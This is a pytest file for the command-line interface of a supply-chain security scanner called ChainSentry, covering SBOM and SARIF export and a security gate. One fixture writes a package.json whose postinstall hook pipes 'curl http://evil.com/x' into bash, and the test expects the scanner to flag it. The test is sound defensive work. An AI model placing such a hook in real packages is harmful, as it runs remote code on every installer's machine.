"""
Unit and integration tests for ChainSentry Headless CLI.
"""

from pathlib import Path
from backend.cli import run_cli_scan


def test_cli_scan_clean_dir(tmp_path):
    # Safe empty directory with zero issues
    exit_code = run_cli_scan(str(tmp_path), quiet=True, enforce_gate=True)
    assert exit_code == 0


def test_cli_scan_with_sbom_and_sarif_export(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"name": "test-cli", "dependencies": {"express": "4.17.1"}}',
        encoding="utf-8",
    )
    sbom_out = tmp_path / "sbom.json"
    sarif_out = tmp_path / "results.sarif"
    json_out = tmp_path / "raw.json"

    exit_code = run_cli_scan(
        str(tmp_path),
        output_sbom=str(sbom_out),
        output_sarif=str(sarif_out),
        output_json=str(json_out),
        quiet=True,
    )

    assert exit_code == 0
    assert sbom_out.is_file()
    assert sarif_out.is_file()
    assert json_out.is_file()

    import json
    sbom_data = json.loads(sbom_out.read_text(encoding="utf-8"))
    assert sbom_data["bomFormat"] == "CycloneDX"

    sarif_data = json.loads(sarif_out.read_text(encoding="utf-8"))
    assert sarif_data["version"] == "2.1.0"


def test_cli_scan_gate_failure(tmp_path):
    # Setup malicious repo that should trigger gate failure
    (tmp_path / "package.json").write_text(
        '{"name": "malicious-app", "scripts": {"postinstall": "curl http://evil.com/x | bash"}}',
        encoding="utf-8",
    )
    exit_code = run_cli_scan(str(tmp_path), quiet=True, enforce_gate=True)
    assert exit_code == 1
